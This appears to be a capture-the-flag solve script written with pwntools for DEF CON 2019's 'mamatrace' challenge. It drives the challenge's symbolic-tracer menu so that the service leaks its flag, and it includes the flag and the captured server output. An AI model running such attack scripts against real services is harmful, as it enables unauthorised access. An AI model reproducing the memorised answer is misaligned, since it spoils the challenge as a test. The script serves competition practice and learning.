#!/usr/bin/env python
from pwn import *

# OOO{brumley was right, hash consing is awesome!}

host , port = 'mamatrace.quals2019.oooverflow.io' , 5000
y = remote( host , port )


def add_unconstrained( name , l ):
    y.sendlineafter( 'Choice:' , '1' )
    y.sendlineafter( ':' , name )
    y.sendlineafter( ':' , l )


def add_constrained( name , val ):
    y.sendlineafter( 'Choice:' , '2' )
    y.sendlineafter( ':' , name )
    y.sendlineafter( ':' , val )

def add_concrete( val ):
    y.sendlineafter( 'Choice:' , '3' )
    y.sendlineafter( ':' , val )

def step( n ):
    y.sendlineafter( 'Choice:' , '1' )
    y.sendlineafter( ':' , str( n ) )

def sym( reg ):
    y.sendlineafter( 'Choice:' , '6' )
    y.sendlineafter( '?' , reg )

def concer( reg ):
    y.sendlineafter( 'Choice:' , '5' )
    y.sendlineafter( '?' , reg )


y.sendlineafter( 'Choice:' , '2' ) # flagleak
y.sendlineafter( 'Choice:' , '1' ) # Start a trace.


add_constrained( 'r12_52_64' , '0790' )

y.sendlineafter( 'Choice:' , '0' )


step( 13 ) # branch

sym( 'r12' )
concer( 'r12' )

step( 1000 )

print "".join(f.split(": ")[1][0] for f in y.recvuntil( 'STDERR' ).split("Flag") if "byte" in f).strip("\\")

y.interactive()


'''
STDOUT: b'Checking input...\nFlag byte 0: O\nFlag byte 1: O\nFlag byte 2: O\nFlag byte 3: {\nFlag byte 4: b\nFlag byte 5: r\nFlag byte 6: u\nFlag byte 7: m\nFlag byte 8: l\nFlag byte 9: e\nFlag byte 10: y\nFlag byte 11:  \nFlag byte 12: w\nFlag byte 13: a\nFlag byte 14: s\nFlag byte 15:  \nFlag byte 16: r\nFlag byte 17: i\nFlag byte 18: g\nFlag byte 19: h\nFlag byte 20: t\nFlag byte 21: ,\nFlag byte 22:  \nFlag byte 23: h\nFlag byte 24: a\nFlag byte 25: s\nFlag byte 26: h\nFlag byte 27:  \nFlag byte 28: c\nFlag byte 29: o\nFlag byte 30: n\nFlag byte 31: s\nFlag byte 32: i\nFlag byte 33: n\nFlag byte 34: g\nFlag byte 35:  \nFlag byte 36: i\nFlag byte 37: s\nFlag byte 38:  \nFlag byte 39: a\nFlag byte 40: w\nFlag byte 41: e\nFlag byte 42: s\nFlag byte 43: o\nFlag byte 44: m\nFlag byte 45: e\nFlag byte 46: !\nFlag byte 47: }\nFlag byte 48: \n\nFlag byte 49: \x00\nFlag byte 50: \x00\nFlag byte 51: \x00\nFlag byte 52: \x00\nFlag byte 53: \x00\nFlag byte 54: \x00\nFlag byte 55: \x00\nFlag byte 56: \x00\nFlag byte 57: \x00\nFlag byte 58: \x00\nFlag byte 59: \x00\nFlag byte 60: \x00\nFlag byte 61: \x00\nFlag byte 62: \x00\nFlag byte 63: \x00\n'
'''